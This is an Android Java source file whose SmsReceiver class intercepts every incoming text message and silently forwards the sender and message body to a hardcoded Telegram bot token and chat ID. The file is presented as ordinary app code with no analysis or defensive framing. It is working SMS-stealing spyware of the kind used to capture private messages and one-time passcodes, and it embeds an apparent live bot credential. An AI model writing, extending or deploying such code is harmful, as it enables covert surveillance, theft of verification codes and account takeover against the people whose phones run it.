
package com.example.buddy;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.telephony.SmsMessage;

public class SmsReceiver extends BroadcastReceiver {

    @Override
    public void onReceive(Context context, Intent intent) {
        Bundle bundle = intent.getExtras();
        if (bundle != null) {
            Object[] pdus = (Object[]) bundle.get("pdus");
            if (pdus != null) {
                for (Object pdu : pdus) {
                    SmsMessage smsMessage = SmsMessage.createFromPdu((byte[]) pdu);
                    String message = smsMessage.getMessageBody();
                    String sender = smsMessage.getOriginatingAddress();
                    sendTelegramMessage("From: " + sender + "\nMessage: " + message);
                }
            }
        }
    }

    private void sendTelegramMessage(String message) {
        new Thread(() -> {
            try {
                String botToken = "6698594387:AAFmjtW8aldtasQa_E_eqkSinGGwH3RprL0";
                String chatId = "6222134199";
                String url = "https://api.telegram.org/bot" + botToken + "/sendMessage?chat_id=" + chatId + "&text=" + message;
                new java.net.URL(url).openStream().close();
            } catch (Exception e) {
                e.printStackTrace();
            }
        }).start();
    }
}
